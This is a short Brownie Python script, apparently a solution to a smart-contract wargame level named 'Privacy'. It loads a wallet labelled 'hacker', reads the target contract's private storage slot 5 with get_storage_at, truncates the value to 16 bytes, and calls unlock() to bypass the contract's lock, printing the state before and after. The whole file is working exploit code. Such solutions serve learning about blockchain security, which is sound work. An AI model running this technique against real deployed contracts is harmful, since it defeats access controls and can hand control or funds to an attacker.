from brownie import accounts, config, web3, interface

def main(address):
    hacker = accounts.add(config['wallets']['from_key'])
    target = interface.PrivacyInterface(address)
    print(f'Locked: {target.locked()}')
    data_key = web3.eth.get_storage_at(address, 5)
    target.unlock(data_key[:16], {'from': hacker})
    print(f'Locked: {target.locked()}')
